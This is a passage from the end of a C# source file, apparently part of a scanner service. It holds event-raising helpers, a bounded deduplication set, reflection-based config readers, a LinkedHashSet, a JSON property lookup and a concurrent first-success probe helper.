                    _statusBroadcaster.Post(status);
                    return;
                }

                var handler = OnStatus;
                if (handler == null) return;
                _ = Task.Run(() =>
                {
                    try { handler.Invoke(this, status); } catch { }
                });
            }
            catch { }
        }

        private void SafeRaiseResult(ScanResult r)
        {
            try
            {
                var handler = OnResult;
                if (handler == null) return;
                _ = Task.Run(() =>
                {
                    try { handler.Invoke(this, r); } catch { }
                });
            }
            catch { }
        }

        // Updated RecentSet (moved to non-nested scope earlier); add Clear() here
        private sealed class RecentSet
        {
            private readonly int _capacity;
            private readonly ConcurrentQueue<string> _order = new ConcurrentQueue<string>();
            private readonly HashSet<string> _set = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            private readonly object _lock = new object();

            public RecentSet(int capacity) { _capacity = Math.Max(1000, capacity); }

            public bool AddIfNew(string key)
            {
                lock (_lock)
                {
                    if (_set.Contains(key)) return false;
                    _set.Add(key);
                    _order.Enqueue(key);
                    while (_set.Count > _capacity && _order.TryDequeue(out var old))
                    {
                        _set.Remove(old);
                    }
                    return true;
                }
            }

            // thread-safe clear for stop/restart scenarios
            public void Clear()
            {
                lock (_lock)
                {
                    _set.Clear();
                    while (_order.TryDequeue(out _)) { }
                }
            }
        }

        // Reflection helper to read optional bool properties from ScanConfig (avoids compile errors if property not present)
        private static bool GetBoolConfig(object cfg, string propName)
        {
            try
            {
                var p = cfg.GetType().GetProperty(propName);
                if (p == null) return false;
                if (p.PropertyType == typeof(bool))
                {
                    return (bool)(p.GetValue(cfg) ?? false);
                }
                if (p.PropertyType == typeof(bool?))
                {
                    var v = p.GetValue(cfg);
                    return v is bool b && b;
                }
            }
            catch { }
            return false;
        }

        // Reflection helper to read optional int properties from ScanConfig (avoids compile errors if property not present)
        private static int GetIntConfig(object cfg, string propName, int defaultValue)
        {
            try
            {
                var p = cfg.GetType().GetProperty(propName);
                if (p == null) return defaultValue;
                var val = p.GetValue(cfg);
                if (val == null) return defaultValue;
                if (p.PropertyType == typeof(int)) return (int)val;
                if (p.PropertyType == typeof(int?)) return (int?)(val) ?? defaultValue;
                return Convert.ToInt32(val);
            }
            catch { return defaultValue; }
        }

        public void Dispose()
        {
            try { _http.Dispose(); } catch { }
            try { _diagnosticHttpClient?.Dispose(); } catch { }
            try { _metricsService?.DisposeAsync().AsTask().Wait(500); } catch { }
        }
    }

    // small LinkedHashSet used by MergeUnique strategy
    internal sealed class LinkedHashSet<T> : IEnumerable<T> where T : notnull
    {
        private readonly Dictionary<T, object> _dict;
        private readonly List<T> _order;
        public LinkedHashSet(IEqualityComparer<T>? comparer = null)
        {
            _dict = new Dictionary<T, object>(comparer ?? EqualityComparer<T>.Default);
            _order = new List<T>();
        }
        public void Add(T item)
        {
            if (!_dict.ContainsKey(item))
            {
                _dict[item] = null!;
                _order.Add(item);
            }
        }
        public bool Contains(T item) => _dict.ContainsKey(item);
        public List<T> ToList() => new List<T>(_order);
        public IEnumerator<T> GetEnumerator() => _order.GetEnumerator();
        System.Collections.IEnumerator System.Collections.IEnumerable.GetEnumerator() => _order.GetEnumerator();
    }

    // JsonElementExtensions left as in original file
    public static class JsonElementExtensions
    {
        public static bool TryGetPropertyIgnoreCaseExt(this JsonElement el, string name, out JsonElement value)
        {
            try
            {
                if (el.ValueKind == JsonValueKind.Object)
                {
                    foreach (var p in el.EnumerateObject())
                    {
                        if (string.Equals(p.Name, name, StringComparison.OrdinalIgnoreCase))
                        {
                            value = p.Value;
                            return true;
                        }
                    }
                }
            }
            catch { }
            value = default;
            return false;
        }
    }

    // ProbeHelpers: FirstSuccessfulTaggedAsync
    internal static class ProbeHelpers
    {
        public static async Task<(string? text, string tag)?> FirstSuccessfulTaggedAsync(
            IEnumerable<Func<CancellationToken, Task<(string? text, string tag)>>> attemptFactories,
            int maxConcurrency,
            TimeSpan? overallTimeout,
            Func<(string? text, string tag), bool> considerSuccess,
            CancellationToken ct)
        {
            if (attemptFactories == null) return null;
            var factories = attemptFactories.ToArray();
            if (factories.Length == 0) return null;

            using var linkedCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
            if (overallTimeout.HasValue && overallTimeout.Value.TotalMilliseconds > 0)
                linkedCts.CancelAfter(overallTimeout.Value);

            var token = linkedCts.Token;
            var semaphore = new SemaphoreSlim(Math.Max(1, maxConcurrency));
            var tasks = new List<Task<(string? text, string tag)>>();

            for (int i = 0; i < factories.Length; i++)
            {
                try
                {
                    await semaphore.WaitAsync(token).ConfigureAwait(false);
                }
                catch (OperationCanceledException) { break; }

                var factory = factories[i];
                var idx = i;
                var t = Task.Run(async () =>
                {
                    try
                    {
                        var r = await factory(token).ConfigureAwait(false);
                        return r;
                    }
                    catch (OperationCanceledException) { return (null, factories[idx].Method.Name); }
                    catch { return (null, factories[idx].Method.Name); }
                    finally { try { semaphore.Release(); } catch { } }
                }, token);

                tasks.Add(t);
            }

            try
            {
                while (tasks.Count > 0)
                {
                    Task<(string? text, string tag)> finished;
                    try
                    {
                        finished = await Task.WhenAny(tasks).ConfigureAwait(false);
                    }
                    catch (OperationCanceledException)
                    {
                        break;
                    }

                    tasks.Remove(finished);

                    (string? text, string tag) res;
                    try { res = await finished.ConfigureAwait(false); } catch { continue; }

                    if (token.IsCancellationRequested) break;

                    if (considerSuccess(res))
                    {
                        try { linkedCts.Cancel(); } catch { }
                        return res;
                    }
                }
            }
            finally
            {
                try { semaphore.Dispose(); } catch { }
            }

            return null;
        }
    }
}